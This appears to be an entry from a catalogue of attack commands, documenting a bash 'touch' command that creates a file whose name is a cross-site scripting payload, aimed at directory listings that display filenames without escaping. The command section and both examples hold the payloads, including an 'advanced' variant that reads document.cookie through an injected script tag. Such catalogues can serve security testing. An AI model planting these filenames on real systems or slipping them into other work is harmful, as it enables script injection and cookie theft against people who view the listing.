---
id: cmd-003
data: touch '"><svg onload=alert(3);'
tags:
  - file-creation
  - xss
type: command
output: No output if successful; file is created in the current directory
executor: bash
platforms:
  - macOS
created_at: '2024-01-01T12:00:00Z'
updated_at: '2025-12-14T03:16:02.744Z'
verified: false
validated: true
submitted: true
---
# touch-malicious-filename

## Command

```bash
touch '"><svg onload=alert(3);'
```

## Description

Creates an empty file with a name containing an XSS payload, exploiting filename injection in directory listings.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| '"><svg onload=alert(3);' | Filename with escaped payload | Yes |

## Examples

### Basic Usage

```bash
touch '"><svg onload=alert(3);'
```

### Advanced Usage

```bash
touch 'payload"><script>alert(document.cookie)</script>'
```

## Expected Output

Silent on success; use `ls` to confirm file existence.

## Related

- [[Related Procedure|procedures/Create-Malicious-Filename-for-XSS]]
